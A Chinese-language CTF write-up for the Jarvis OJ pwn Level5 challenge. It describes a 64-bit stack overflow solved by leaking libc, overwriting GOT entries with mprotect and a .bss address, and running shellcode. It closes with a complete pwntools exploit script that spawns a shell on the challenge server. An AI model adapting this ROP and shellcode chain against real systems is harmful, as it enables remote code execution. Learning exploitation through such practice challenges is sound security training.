

# 7.17

# Javis OJ pwn Level5 WP(菜鸡塘坑记)

> 总体来说还是我太菜了，原本按照师傅们的进度都应该在学堆了，而我这个垃圾却狗在栈上面无法自拔，我得加快进度啊。

题目地址:[传送门](https://www.jarvisoj.com/challenges)

本题是一道真的基础的栈溢出，连```libc```都给了，所以说都没啥问题，这里面给的提示是:

>mmap和mprotect练习，假设system和execve函数被禁用，请尝试使用mmap和mprotect完成本题。

之后这是朱师傅这两天在搞的题，我就凑凑热闹，毕竟太菜得向朱师傅学习，之后开始试着做，文件是64位的，IDA看一波是这个样子的。

![](https://github.com/Edgaraaa/summer_hoilday2019/blob/master/7.17/img/3.png?raw=true)

![](https://github.com/Edgaraaa/summer_hoilday2019/blob/master/7.17/img/1.png?raw=true)

![](https://github.com/Edgaraaa/summer_hoilday2019/blob/master/7.17/img/2.png?raw=true)

之后根据我那微薄的知识告诉我，知识盲区我不会，之后根据朱师傅给的提示，与```mprotect```这个函数有关系，查过```.bss```段可读可写但是不可执行，百度查了一下```mprotect```这个函数是啥用的:

```c
NAME         
       mprotect, pkey_mprotect - set protection on a region of memory
SYNOPSIS         
       #include <sys/mman.h>

       int mprotect(void *addr, size_t len, int prot);
       int pkey_mprotect(void *addr, size_t len, int prot, int pkey);
……
```

大概知道了```mprotect```是设置内存页权限的一个函数，然后底下看了看几个参数我愣是不知道可执行的```int```是多少，还是问了朱师傅才知道，我好菜啊。

之后接着得考虑用啥```gadget```来执行栈溢出，pattern查了一波偏移量是*128+8*，之后分析到我们应该得做哪几件事情呢？

1. 通过```write```函数泄露```read_got```地址，然后计算出```libc```的基地址，然后通过```libc```计算出```mprotect```的地址
2. 向```got表```中写入```mprotect```的地址
3. 向*.bss*段写入```shellcode```
4. 向```got表```中写入```bss```的地址
5. 用```ret2csu```调用```mprotect```将*.bss*权限设置为可执行，然后返回到bss上执行shellcode

之后其实在大佬师傅们手里，这题目很简单，可是我菜啊，下面主要讲讲我的塘坑记录。

### plt和got的关系没有搞清楚

这是我今天上午还搞错的问题，这个函数调用的关系其实现在我还是有点糊涂，就是啥时候应该用plt啥时候该用got地址，这个我还是太菜了

### 能别图省事而找麻烦

有很大一部分时间我是用在想用ret2csu不是等效的嘛，为啥不可以，等我用另外的gadget解决完问题之后再想也不急啊，要是比赛的时候会浪费更多时间，原本想一直用csu撸完整个的，但是发现根本不需要，用其他短的gadget反而更好实现。

### got表覆写的位置好像有讲究

今早问曹师傅，曹师傅并不建议我写在为0的常量上面，他推荐我写在其他已经有的函数上面，之后上午还不算太理解，然后晚上多看了几篇wp才明白他的意思，我选择写在```__libc_start_main```上面，然后就好了。

### 然后不能理解为啥要用pause

之后好像是为了维持线程，这个真的是涨知识了。

最后上exp:

```python
#!/usr/bin/python
from pwn import *
context.log_level='debug'
context(os='linux',arch='amd64')
#sh=process('./1')
sh=remote("pwn2.jarvisoj.com",9884)
exe=ELF('./1')
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc=ELF('./libc-2.19.so')
main=exe.symbols['main']
csu_front_addr = 0x400690
csu_end_addr=0x4006aa
read_plt=exe.symbols['read']
read_got=exe.got['read']
bss=exe.bss()
write_plt=exe.symbols['write']
write_got=exe.got['write']
pop_rdi=0x4006b3
pop_rsi=0x4006b1
shellcode=asm(shellcraft.amd64.sh())
def csu(rbx,rbp,r12,r13,r14,r15,last):
	payload = 'a'*136
	payload+=p64(csu_end_addr)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)
	payload+=p64(csu_front_addr)
	payload+='a'*0x38
	payload+=p64(last)
	print 'payload+++++'+payload
	sh.send(payload)
	sleep(1)
	pause()

sh.recvuntil('Input:\n')
payload123='a'*136+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(read_got)+'deadbuff'+p64(write_plt)+p64(main)
sh.send(payload123)
sleep(0.2)
pause()
read_addr=u64(sh.recv(8))
libc.address=read_addr-libc.symbols['read']
mprotect=libc.symbols['mprotect']
libc_start_main_got=exe.got['__libc_start_main']
payload2='a'*136+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(libc_start_main_got)+"deadbuff"+p64(read_plt)+p64(main)
sh.send(payload2)
sleep(0.2)
sh.send(p64(mprotect))
sleep(0.2)
pause()
#mprotect=libc.symbols['mprotect']
payloadpp='a'*136+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss)+'deadbuff'+p64(read_plt)+p64(main)
sh.send(payloadpp)
sleep(0.2)
sh.send(shellcode)
sleep(0.2)
pause()
#libc_start_main_got=exe.got['__libc_start_main']
#payload2='a'*136+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(libc_start_main_got)+"deadbuff"+p64(read_plt)+p64(main)
#sh.send(payload2)
#sleep(0.2)
#sh.send(p64(mprotect))
sh.recvuntil('Input:\n')
gmon_start_got=exe.got['__gmon_start__']
payload3='a'*136+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(gmon_start_got)+"deadbuff"+p64(read_plt)+p64(main)
sh.send(payload3)
sleep(0.2)
sh.send(p64(bss))
sleep(0.2)
#csu2(0,1,mprotect_got,7,0x1000,0x600000,bss_got)
payloadkkp='a'*136+p64(csu_end_addr)+p64(0)+p64(1)+p64(libc_start_main_got)+p64(7)+p64(0x1000)+p64(0x600000)
payloadkkp+=p64(csu_front_addr)
payloadkkp+='deadbuff'+p64(0)+p64(1)+p64(gmon_start_got)+p64(0)+p64(0)+p64(0)
payloadkkp+=p64(csu_front_addr)
sleep(0.2)
pause()
sh.send(payloadkkp)
sh.interactive()
```

![](https://github.com/Edgaraaa/summer_hoilday2019/blob/master/7.17/img/4.png?raw=true)

总共用了一天多才搞定，我好菜啊！！！